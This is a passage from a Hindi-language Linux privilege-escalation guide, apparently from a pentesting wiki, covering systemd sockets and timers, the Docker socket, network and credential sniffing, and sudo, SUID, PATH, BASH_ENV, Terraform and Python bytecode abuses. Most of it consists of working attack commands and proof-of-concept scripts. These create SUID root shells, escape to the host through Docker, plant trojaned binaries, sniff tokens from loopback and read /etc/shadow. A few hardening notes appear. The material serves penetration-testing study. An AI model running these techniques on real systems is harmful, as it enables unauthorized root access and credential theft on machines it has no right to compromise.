> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

इसलिए, इस अनुमति का दुरुपयोग करने के लिए आपको यह करना होगा:

- कोई systemd unit (जैसे `.service`) खोजें जो **एक writable binary** चला रही हो
- कोई systemd unit खोजें जो **एक relative path** चला रही हो और आपके पास **systemd PATH** पर **writable privileges** हों (उस executable की नकल करने के लिए)

**timers के बारे में अधिक जानने के लिए `man systemd.timer` देखें।**

### **Timer को सक्षम करना**

Timer को सक्षम करने के लिए आपको root privileges चाहिए और यह execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note that the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) एक ही या अलग-अलग machines पर client-server models के भीतर **process communication** सक्षम करते हैं। वे inter-computer communication के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के माध्यम से set up किए जाते हैं।

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**sockets के बारे में अधिक जानने के लिए `man systemd.socket` देखें।** इस file के अंदर, कई interesting parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये options अलग-अलग हैं, लेकिन एक summary का उपयोग यह **indicate करने के लिए किया जाता है कि socket कहाँ listen करेगा** (AF_UNIX socket file का path, listen करने के लिए IPv4/6 और/या port number, etc.)
- `Accept`: एक boolean argument लेता है। अगर **true** हो, तो हर incoming connection के लिए एक **service instance is spawned** किया जाता है और केवल connection socket उसे पास किया जाता है। अगर **false** हो, तो सभी listening sockets खुद **started service unit को pass** किए जाते हैं, और सभी connections के लिए केवल एक service unit spawn होता है। यह value datagram sockets और FIFOs के लिए ignored होती है, जहाँ एक single service unit बिना शर्त सभी incoming traffic को handle करता है। **Default false है**। performance reasons से, नए daemons को केवल इस तरह लिखना recommended है जो `Accept=no` के लिए suitable हो।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेता है, जिन्हें listening **sockets**/FIFOs के **created** और bound होने से पहले या बाद में, respectively, **executed** किया जाता है। command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के arguments होने चाहिए।
- `ExecStopPre`, `ExecStopPost`: additional **commands** जो listening **sockets**/FIFOs के **closed** और removed होने से पहले या बाद में, respectively, **executed** किए जाते हैं।
- `Service`: **service** unit का नाम specify करता है जिसे **incoming traffic** पर **activate** करना है। यह setting केवल Accept=no वाले sockets के लिए allowed है। default में यह उसी नाम की service होती है जो socket के समान नाम रखती है (suffix बदला हुआ होता है)। अधिकांश मामलों में, इस option का उपयोग करना आवश्यक नहीं होना चाहिए।

### Writable .socket files

अगर आपको एक **writable** `.socket` file मिलती है, तो आप `[Socket]` section की शुरुआत में कुछ ऐसा **add** कर सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket के create होने से पहले execute हो जाएगा। इसलिए, आपको **संभवतः machine के reboot होने तक wait करना पड़ेगा।**\
_ध्यान दें कि system को उस socket file configuration का उपयोग करना चाहिए, वरना backdoor execute नहीं होगा_

### Socket activation + writable unit path (create missing service)

एक और high-impact misconfiguration है:

- `Accept=no` और `Service=<name>.service` वाला socket unit
- referenced service unit missing हो
- attacker `/etc/systemd/system` (या किसी और unit search path) में write कर सकता हो

ऐसे में, attacker `<name>.service` create कर सकता है, फिर socket पर traffic trigger कर सकता है ताकि systemd नई service को root के रूप में load और execute करे।

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

यदि आप **किसी भी writable socket की पहचान करते हैं** (_अब हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket के साथ communicate** कर सकते हैं और शायद किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets HTTP** requests के लिए listening कर रहे हो सकते हैं (_मैं .socket files की बात नहीं कर रहा, बल्कि उन files की जो unix sockets की तरह काम करती हैं_)। आप इसे इस तरह check कर सकते हैं:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
अगर socket **HTTP** request के साथ **responds** करता है, तो आप उससे **communicate** कर सकते हैं और शायद किसी **vulnerability** का **exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक critical file है जिसे secure किया जाना चाहिए। By default, यह `root` user और `docker` group के members द्वारा writable होता है। इस socket पर write access होना privilege escalation तक ले जा सकता है। इसे कैसे किया जा सकता है, इसका breakdown और वैकल्पिक तरीके नीचे दिए गए हैं अगर Docker CLI उपलब्ध न हो।

#### **Privilege Escalation with Docker CLI**

अगर आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges escalate कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये commands आपको host के file system पर root-level access के साथ एक container चलाने देते हैं।

#### **Using Docker API Directly**

उन मामलों में जब Docker CLI उपलब्ध नहीं होता, Docker socket को फिर भी Docker API और `curl` commands का उपयोग करके manipulate किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host system की root directory को mount करने वाला container बनाने के लिए request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container से connection establish करने के लिए `socat` का उपयोग करें, जिससे उसके भीतर command execution संभव हो।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` connection सेट करने के बाद, आप container के भीतर सीधे host के filesystem पर root-level access के साथ commands execute कर सकते हैं।

### Others

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **`docker` group** के अंदर हैं, तो आपके पास [**privileges escalate करने के और तरीके**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API किसी port पर listening** है, तो आप इसे compromise भी कर सकते हैं](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**containers से बाहर निकलने या container runtimes का abuse करके privileges escalate करने के और तरीके** यहाँ देखें:

{{#ref}}
container-security/
{{endref}}

## Containerd (ctr) privilege escalation

यदि आप **`ctr`** command का उपयोग कर सकते हैं, तो नीचे दिया गया page पढ़ें, क्योंकि **आप इसका abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{endref}}

## **RunC** privilege escalation

यदि आप **`runc`** command का उपयोग कर सकते हैं, तो नीचे दिया गया page पढ़ें, क्योंकि **आप इसका abuse करके privileges escalate कर सकते हैं**:


{{#ref}}
runc-privilege-escalation.md
{{endref}}

## **D-Bus**

D-Bus एक sophisticated **inter-Process Communication (IPC) system** है, जो applications को efficiently interact करने और data share करने देता है। Modern Linux system को ध्यान में रखकर design किया गया, यह application communication के अलग-अलग रूपों के लिए एक robust framework देता है।

यह system versatile है, और basic IPC को support करता है जो processes के बीच data exchange को बेहतर बनाता है, और **enhanced UNIX domain sockets** जैसा लगता है। इसके अलावा, यह events या signals broadcast करने में मदद करता है, जिससे system components के बीच seamless integration होती है। उदाहरण के लिए, Bluetooth daemon से आने वाली call के बारे में signal किसी music player को mute करने के लिए prompt कर सकता है, जिससे user experience बेहतर होता है। साथ ही, D-Bus remote object system को support करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, और traditionally complex रहे processes को streamline करता है।

D-Bus एक **allow/deny model** पर काम करता है, जो message permissions (method calls, signal emissions, आदि) को matching policy rules के cumulative effect के आधार पर manage करता है। ये policies bus के साथ interactions को specify करती हैं, और इन permissions के exploitation के through privilege escalation की संभावना देती हैं।

`/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी policy का एक example दिया गया है, जो root user को `fi.w1.wpa_supplicant1` से messages own करने, send करने और receive करने की permissions detail में बताता है।

जिन policies में कोई specified user या group नहीं होता, वे universally apply होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य specific policies से covered नहीं हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**जानें कि यहां D-Bus communication को enumerate और exploit कैसे करें:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

नेटवर्क को enumerate करना और machine की position समझना हमेशा दिलचस्प होता है।

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### आउटबाउंड फ़िल्टरिंग quick triage

अगर host commands चला सकता है लेकिन callbacks fail हो रहे हैं, तो DNS, transport, proxy, और route filtering को जल्दी से अलग करें:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### खुले ports

मशीन पर चल रही network services को हमेशा check करें, जिन्हें access करने से पहले आप interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
बाइंड टारगेट के आधार पर listeners को classify करें:

- `0.0.0.0` / `[::]`: सभी local interfaces पर exposed.
- `127.0.0.1` / `::1`: local-only (अच्छे tunnel/forward candidates).
- Specific internal IPs (जैसे `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल internal segments से reachable.

### Local-only service triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` पर bound services अक्सर पहली बार आपके shell से reachable हो जाती हैं। एक quick local workflow यह है:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### नेटवर्क स्कैनर के रूप में LinPEAS (network-only mode)

local PE checks के अलावा, linPEAS एक focused network scanner के रूप में भी चल सकता है। यह `$PATH` में उपलब्ध binaries का उपयोग करता है (आमतौर पर `fping`, `ping`, `nc`, `ncat`) और कोई tooling install नहीं करता।
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
यदि आप `-d`, `-p`, या `-i` को `-t` के बिना pass करते हैं, तो linPEAS एक pure network scanner की तरह behave करता है (बाकी privilege-escalation checks को skip करते हुए).

### Sniffing

जांचें कि क्या आप traffic sniff कर सकते हैं। अगर आप कर सकते हैं, तो आप कुछ credentials grab करने में सक्षम हो सकते हैं.
```
timeout 1 tcpdump
```
त्वरित व्यावहारिक जांचें:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) post-exploitation में खास तौर पर valuable है क्योंकि कई internal-only services वहाँ tokens/cookies/credentials expose करती हैं:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
कैप्चर अब करें, parse बाद में करें:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Users

### Generic Enumeration

जांचें **आप** कौन हैं, आपके पास कौन-कौन से **privileges** हैं, सिस्टम में कौन-कौन से **users** हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux versions एक bug से प्रभावित थे जो **UID > INT_MAX** वाले users को privileges escalate करने की अनुमति देता है। अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Groups

जांचें कि क्या आप **some group** के member हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

जांचें कि क्या clipboard के अंदर कोई interesting चीज़ मौजूद है (अगर संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात passwords

यदि आपको environment का कोई भी **password** पता है, तो उसी password का उपयोग करके **हर user** के रूप में login करने की कोशिश करें।

### Su Brute

अगर आपको बहुत शोर करने से कोई समस्या नहीं है और computer पर `su` तथा `timeout` binaries मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) भी `-a` parameter के साथ users को brute-force करने की कोशिश करता है।

## Writable PATH abuses

### $PATH

अगर आपको लगता है कि आप $PATH के किसी folder के अंदर **write** कर सकते हैं, तो आप **writable folder के अंदर एक backdoor बनाकर** privileges escalate कर सकते हैं, किसी ऐसे command के नाम से जो किसी अलग user द्वारा execute की जाने वाली है (आदर्श रूप से root) और जो $PATH में आपके writable folder से **पहले स्थित किसी folder** से load नहीं होती।

### SUDO and SUID

आपको sudo का उपयोग करके कुछ command execute करने की अनुमति हो सकती है, या उनमें suid bit हो सकता है। इसे इस तरह check करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको files को read और/or write करने, या यहाँ तक कि एक command execute करने की अनुमति देती हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo configuration किसी यूज़र को पासवर्ड जाने बिना किसी दूसरे यूज़र की privileges के साथ कुछ command execute करने की अनुमति दे सकती है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `vim` को `root` के रूप में चला सकता है, अब root डायरेक्टरी में एक ssh key जोड़कर या `sh` को कॉल करके shell प्राप्त करना बहुत आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह directive उपयोगकर्ता को कुछ execute करते समय **एक environment variable सेट** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer** पर आधारित, **PYTHONPATH hijacking** के लिए **vulnerable** था, जिससे स्क्रिप्ट को root के रूप में execute करते समय एक arbitrary python library load की जा सकती थी:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Writable `__pycache__` / `.pyc` poisoning in sudo-allowed Python imports

अगर कोई **sudo-allowed Python script** किसी ऐसे module को import करता है जिसके package directory में **writable `__pycache__`** है, तो आप cached `.pyc` को replace करके अगले import पर privileged user के रूप में code execution हासिल कर सकते हैं।

- यह क्यों काम करता है:
- CPython bytecode caches को `__pycache__/module.cpython-<ver>.pyc` में store करता है।
- Interpreter **header** (magic + source से जुड़ा timestamp/hash metadata) को validate करता है, फिर उस header के बाद stored marshaled code object को execute करता है।
- अगर directory writable हो, तो आप cached file को **delete और recreate** कर सकते हैं; इस तरह root-owned लेकिन non-writable `.pyc` भी replace किया जा सकता है।
- Typical path:
- `sudo -l` एक Python script या wrapper दिखाता है जिसे आप root के रूप में run कर सकते हैं।
- वह script `/opt/app/`, `/usr/local/lib/...`, आदि से local module import करती है।
- imported module का `__pycache__` directory आपके user या सभी के लिए writable होता है।

Quick enumeration:
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
यदि आप privileged script का निरीक्षण कर सकते हैं, तो imported modules और उनका cache path पहचानें:
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
दुरुपयोग वर्कफ़्लो:

1. sudo-allowed script को एक बार चलाएँ ताकि Python legit cache file बना दे, अगर वह पहले से मौजूद नहीं है।
2. legit `.pyc` से पहले 16 bytes पढ़ें और उन्हें poisoned file में reuse करें।
3. payload code object compile करें, `marshal.dumps(...)` करें, original cache file delete करें, और उसे original header plus आपके malicious bytecode के साथ फिर से create करें।
4. sudo-allowed script को फिर से चलाएँ ताकि import आपके payload को root के रूप में execute करे।

महत्वपूर्ण नोट्स:

- original header को reuse करना key है क्योंकि Python cache metadata को source file के against check करता है, न कि यह कि bytecode body सच में source से match करती है।
- यह खास तौर पर तब useful है जब source file root-owned हो और writable न हो, लेकिन containing `__pycache__` directory writable हो।
- attack fail हो जाता है अगर privileged process `PYTHONDONTWRITEBYTECODE=1` use करे, safe permissions वाली location से import करे, या import path में हर directory से write access हटा दे।

Minimal proof-of-concept shape:
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Hardening:

- सुनिश्चित करें कि privileged Python import path में कोई भी directory low-privileged users द्वारा writable न हो, `__pycache__` सहित।
- Privileged runs के लिए, `PYTHONDONTWRITEBYTECODE=1` और unexpected writable `__pycache__` directories के periodic checks पर विचार करें।
- Writable local Python modules और writable cache directories को उसी तरह treat करें जैसे आप writable shell scripts या root द्वारा execute की जाने वाली shared libraries को करते हैं।

### BASH_ENV sudo env_keep के माध्यम से preserved → root shell

अगर sudoers `BASH_ENV` को preserve करता है (जैसे, `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive startup behavior का उपयोग करके allowed command invoke करते समय root के रूप में arbitrary code चला सकते हैं।

- यह क्यों काम करता है: Non-interactive shells के लिए, Bash `$BASH_ENV` को evaluate करता है और target script चलाने से पहले उस file को source करता है। कई sudo rules किसी script या shell wrapper को run करने की अनुमति देते हैं। अगर `BASH_ENV` sudo द्वारा preserved है, तो आपकी file root privileges के साथ source होती है।

- Requirements:
- एक sudo rule जिसे आप चला सकें (कोई भी target जो `/bin/bash` को non-interactive रूप से invoke करता हो, या कोई bash script)।
- `env_keep` में `BASH_ENV` present होना चाहिए (`sudo -l` से check करें)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- preserved env vars के इस्तेमाल पर sudo I/O logging और alerting पर विचार करें।

### Terraform via sudo with preserved HOME (!env_reset)

अगर sudo environment को intact छोड़ता है (`!env_reset`) और `terraform apply` की अनुमति देता है, तो `$HOME` calling user जैसा ही रहता है। इसलिए Terraform root के रूप में **$HOME/.terraformrc** लोड करता है और `provider_installation.dev_overrides` को honor करता है।

- required provider को एक writable directory की ओर point करें और provider के नाम वाला एक malicious plugin drop करें (उदा., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform Go plugin handshake में fail करेगा, लेकिन मरने से पहले payload को root के रूप में execute करेगा, और पीछे एक SUID shell छोड़ जाएगा।

### TF_VAR overrides + symlink validation bypass

Terraform variables को `TF_VAR_<name>` environment variables के जरिए provide किया जा सकता है, जो तब भी survive करते हैं जब sudo environment को preserve करता है। कमजोर validations जैसे `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` को symlinks के साथ bypass किया जा सकता है:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform symlink को resolve करता है और असली `/root/root.txt` को attacker-readable destination में copy करता है। यही तरीका privileged paths में **write** करने के लिए भी इस्तेमाल किया जा सकता है, destination symlinks को पहले से बनाकर (उदाहरण के लिए, provider’s destination path को `/etc/cron.d/` के अंदर point करना)।

### requiretty / !requiretty

कुछ पुराने distributions पर, sudo को `requiretty` के साथ configure किया जा सकता है, जो sudo को केवल interactive TTY से चलने के लिए force करता है। अगर `!requiretty` set है (या option absent है), तो sudo को non-interactive contexts जैसे reverse shells, cron jobs, या scripts से execute किया जा सकता है।
```bash
Defaults !requiretty
```
यह अपने आप में सीधी vulnerability नहीं है, लेकिन यह उन स्थितियों का विस्तार करती है जहाँ sudo rules का abuse full PTY की आवश्यकता के बिना किया जा सकता है।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

अगर `sudo -l` में `env_keep+=PATH` या कोई `secure_path` दिखे जिसमें attacker-writable entries हों (जैसे `/home/<user>/bin`), तो sudo-allowed target के अंदर कोई भी relative command shadow की जा सकती है।

- Requirements: एक sudo rule (अक्सर `NOPASSWD`) जो ऐसा script/binary चलाता हो जो commands को absolute paths के बिना call करता हो (`free`, `df`, `ps`, etc.) और एक writable PATH entry जो पहले search होती हो।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution bypassing paths
**Jump** अन्य फाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

अगर **sudo permission** किसी एक command को **path specify किए बिना** दी गई है: _hacker10 ALL= (root) less_ तो आप PATH variable बदलकर इसका exploitation कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है अगर कोई **suid** binary **कोई दूसरा command path बताए बिना execute करती है (हमेशा किसी अजीब SUID binary की content को** _**strings**_ **से check करें)**।

[Execute करने के लिए payload examples.](payloads-to-execute.md)

### SUID binary with command path

अगर **suid** binary **path specify करके कोई दूसरा command execute करती है**, तो आप उसी command के नाम से एक **function export** करने की कोशिश कर सकते हैं, जिसे suid file call कर रही है।

उदाहरण के लिए, अगर कोई suid binary _**/usr/sbin/service apache2 start**_ call करती है, तो आपको function create करके उसे export करने की कोशिश करनी होगी:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Then, when you call the suid binary, this function will be executed

### Writable script executed by a SUID wrapper

एक सामान्य custom-app misconfiguration एक root-owned SUID binary wrapper है जो एक script execute करता है, जबकि script खुद low-priv users द्वारा writable होती है।

Typical pattern:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
यदि `/usr/local/bin/backup.sh` writable है, तो आप payload commands जोड़ सकते हैं और फिर SUID wrapper execute कर सकते हैं:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
त्वरित जांचें:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
